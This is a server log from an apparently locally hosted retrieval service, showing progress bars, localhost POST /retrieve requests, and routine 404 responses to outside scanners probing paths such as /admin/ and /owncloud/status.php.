-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.72it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.71it/s]
-INFO:     127.0.0.1:48762 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 13.52it/s]
-INFO:     127.0.0.1:34602 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     149.86.227.49:51976 - "GET / HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:36324 - "GET / HTTP/1.1" 404 Not Found
-INFO:     198.235.24.122:64282 - "GET / HTTP/1.1" 404 Not Found
-INFO:     45.156.130.43:35503 - "GET / HTTP/1.1" 404 Not Found
-INFO:     45.156.130.40:43401 - "GET /console HTTP/1.1" 404 Not Found
-INFO:     45.156.130.40:49365 - "GET /owncloud/status.php HTTP/1.1" 404 Not Found
-INFO:     45.156.130.41:56751 - "GET /status.php HTTP/1.1" 404 Not Found
-INFO:     45.156.130.40:52295 - "GET / HTTP/1.1" 404 Not Found
-INFO:     45.156.130.42:33751 - "GET /api/session/properties HTTP/1.1" 404 Not Found
-INFO:     45.156.130.40:42307 - "GET /admin/ HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     45.156.130.41:43777 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 404 Not Found
-INFO:     121.159.85.116:52440 - "GET / HTTP/1.0" 404 Not Found
-INFO:     149.86.227.49:37536 - "GET / HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:36178 - "GET / HTTP/1.1" 404 Not Found
-INFO:     47.236.251.7:51550 - "GET http%3A//passport.baidu.com/ HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     149.86.227.49:47736 - "GET / HTTP/1.1" 404 Not Found
-INFO:     172.105.128.13:46438 - "GET / HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:50700 - "GET / HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     198.235.24.161:62696 - "GET / HTTP/1.1" 404 Not Found
-INFO:     149.86.227.49:44944 - "GET / HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.93it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.91it/s]
-INFO:     127.0.0.1:34724 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 14.75it/s]
-INFO:     127.0.0.1:36870 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.09it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.08it/s]
-INFO:     127.0.0.1:52108 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:34530 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.54it/s]
-INFO:     127.0.0.1:49738 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.51it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.50it/s]
-INFO:     127.0.0.1:36304 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.55it/s]
-INFO:     127.0.0.1:59900 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.65it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.63it/s]
-INFO:     127.0.0.1:58056 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 17.19it/s]
-INFO:     127.0.0.1:53772 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/4 [00:00<?, ?it/s]Retrieval process:  25%|██▌       | 1/4 [00:00<00:00,  5.80it/s]Retrieval process:  50%|█████     | 2/4 [00:00<00:00,  5.61it/s]Retrieval process:  75%|███████▌  | 3/4 [00:00<00:00,  5.61it/s]Retrieval process: 100%|██████████| 4/4 [00:00<00:00,  5.78it/s]Retrieval process: 100%|██████████| 4/4 [00:00<00:00,  5.73it/s]
-INFO:     127.0.0.1:47104 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  1.45it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  1.45it/s]
-INFO:     127.0.0.1:36504 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.35it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  7.33it/s]
-INFO:     127.0.0.1:55812 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.56it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.55it/s]
-INFO:     127.0.0.1:45428 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 11.04it/s]
-INFO:     127.0.0.1:35348 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.75it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.74it/s]
-INFO:     127.0.0.1:47998 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.74it/s]
-INFO:     127.0.0.1:45658 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.63it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.63it/s]
-INFO:     127.0.0.1:52966 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 11.31it/s]
-INFO:     127.0.0.1:59732 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.72it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.71it/s]
-INFO:     127.0.0.1:35694 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.14it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.13it/s]
-INFO:     127.0.0.1:50928 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/4 [00:00<?, ?it/s]Retrieval process:  25%|██▌       | 1/4 [00:00<00:00,  5.46it/s]Retrieval process:  50%|█████     | 2/4 [00:00<00:00,  3.96it/s]Retrieval process:  75%|███████▌  | 3/4 [00:00<00:00,  4.43it/s]Retrieval process: 100%|██████████| 4/4 [00:00<00:00,  4.97it/s]Retrieval process: 100%|██████████| 4/4 [00:00<00:00,  4.75it/s]
-INFO:     127.0.0.1:35610 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-INFO:     149.86.227.49:54414 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  4.31it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.02it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  5.68it/s]
-INFO:     127.0.0.1:45546 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  4.41it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  4.93it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  4.84it/s]
-INFO:     127.0.0.1:51908 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.18it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.17it/s]
-INFO:     127.0.0.1:43644 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.72it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.71it/s]
-INFO:     127.0.0.1:45014 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.96it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.88it/s]
-INFO:     127.0.0.1:58472 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.33it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.33it/s]
-INFO:     127.0.0.1:55078 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.65it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.64it/s]
-INFO:     127.0.0.1:37216 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-INFO:     206.168.34.93:45844 - "GET / HTTP/1.1" 404 Not Found
-INFO:     206.168.34.93:45870 - "PRI %2A HTTP/2.0" 404 Not Found
-WARNING:  Invalid HTTP request received.
-INFO:     206.168.34.93:50678 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     206.168.34.93:36368 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
-INFO:     206.168.34.93:36384 - "GET /favicon.ico HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.23it/s]
-INFO:     127.0.0.1:60566 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:34420 - "GET / HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     149.86.227.49:46244 - "GET / HTTP/1.1" 404 Not Found
-WARNING:  Invalid HTTP request received.
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.53it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.52it/s]
-INFO:     127.0.0.1:58338 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 14.35it/s]
-INFO:     127.0.0.1:58632 - "POST /retrieve HTTP/1.1" 200 OK
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-WARNING:  Invalid HTTP request received.
-INFO:     149.86.227.49:53088 - "GET / HTTP/1.1" 404 Not Found
-INFO:     124.234.78.152:24421 - "GET /status HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.27it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.26it/s]
-INFO:     127.0.0.1:50688 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 12.81it/s]
-INFO:     127.0.0.1:34438 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.23it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  6.21it/s]
-INFO:     127.0.0.1:58594 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 13.29it/s]
-INFO:     127.0.0.1:36812 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:55878 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  5.51it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.73it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.51it/s]
-INFO:     127.0.0.1:39710 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.26it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.24it/s]
-INFO:     127.0.0.1:34126 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  5.86it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  7.06it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.84it/s]
-INFO:     127.0.0.1:56070 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.95it/s]
-INFO:     127.0.0.1:39752 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  5.74it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.99it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.77it/s]
-INFO:     127.0.0.1:46222 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.79it/s]
-INFO:     127.0.0.1:54376 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.30it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  4.00it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.60it/s]
-INFO:     127.0.0.1:49980 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.21it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.20it/s]
-INFO:     127.0.0.1:40992 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:34790 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  3.78it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  5.63it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  5.24it/s]
-INFO:     127.0.0.1:49698 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.20it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  8.18it/s]
-INFO:     127.0.0.1:35978 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  5.69it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.83it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  6.62it/s]
-INFO:     127.0.0.1:50128 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.15it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  4.14it/s]
-INFO:     127.0.0.1:54028 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     147.185.132.180:64716 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.95it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.94it/s]
-INFO:     127.0.0.1:39818 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 22.06it/s]
-INFO:     127.0.0.1:43360 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.02it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.20it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.94it/s]
-INFO:     127.0.0.1:35916 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 20.26it/s]
-INFO:     127.0.0.1:44402 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  1.72it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.42it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.28it/s]
-INFO:     127.0.0.1:47484 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.33it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  5.32it/s]
-INFO:     127.0.0.1:59776 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 26.78it/s]
-INFO:     127.0.0.1:37074 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.59it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.68it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.66it/s]
-INFO:     127.0.0.1:42140 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.75it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  9.72it/s]
-INFO:     127.0.0.1:33468 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.42it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.85it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.77it/s]
-INFO:     127.0.0.1:46390 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 21.55it/s]
-INFO:     127.0.0.1:34920 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  3.47it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.78it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.86it/s]
-INFO:     127.0.0.1:43216 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 15.86it/s]
-INFO:     127.0.0.1:50350 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.52it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.52it/s]
-INFO:     127.0.0.1:46554 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 15.62it/s]
-INFO:     127.0.0.1:43332 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:36300 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.68it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.67it/s]
-INFO:     127.0.0.1:59794 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 23.85it/s]
-INFO:     127.0.0.1:34686 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  3.05it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.49it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.42it/s]
-INFO:     127.0.0.1:40218 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 10.77it/s]
-INFO:     127.0.0.1:55598 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.04it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.08it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.07it/s]
-INFO:     127.0.0.1:42778 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 17.06it/s]
-INFO:     127.0.0.1:47178 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  4.40it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  4.23it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  4.25it/s]
-INFO:     127.0.0.1:51716 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 15.23it/s]
-INFO:     127.0.0.1:35326 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.90it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.89it/s]
-INFO:     127.0.0.1:58618 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.33it/s]
-INFO:     127.0.0.1:39604 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.95it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.94it/s]
-INFO:     127.0.0.1:41530 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 25.70it/s]
-INFO:     127.0.0.1:58104 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.86it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.85it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.85it/s]
-INFO:     127.0.0.1:59026 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 14.12it/s]
-INFO:     127.0.0.1:43076 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.29it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.39it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.38it/s]
-INFO:     127.0.0.1:44008 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.28it/s]
-INFO:     127.0.0.1:54870 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.60it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.30it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  2.34it/s]
-INFO:     127.0.0.1:53104 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 17.27it/s]
-INFO:     127.0.0.1:50838 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.13it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  3.13it/s]
-INFO:     127.0.0.1:44620 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 23.51it/s]
-INFO:     127.0.0.1:52170 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.26it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00,  2.26it/s]
-INFO:     127.0.0.1:54616 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 24.42it/s]
-INFO:     127.0.0.1:51198 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  2.29it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.36it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.14it/s]
-INFO:     127.0.0.1:33796 - "POST /retrieve HTTP/1.1" 200 OK
-INFO:     149.86.227.49:33712 - "GET / HTTP/1.1" 404 Not Found
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 19.48it/s]
-INFO:     127.0.0.1:34546 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/2 [00:00<?, ?it/s]Retrieval process:  50%|█████     | 1/2 [00:00<00:00,  3.31it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.94it/s]Retrieval process: 100%|██████████| 2/2 [00:00<00:00,  3.83it/s]
-INFO:     127.0.0.1:33142 - "POST /retrieve HTTP/1.1" 200 OK
-Retrieval process:   0%|          | 0/1 [00:00<?, ?it/s]Retrieval process: 100%|██████████| 1/1 [00:00<00:00, 16.81it/s]
-INFO:     127.0.0.1:53378 - "POST /retrieve HTTP/1.1" 200 OK
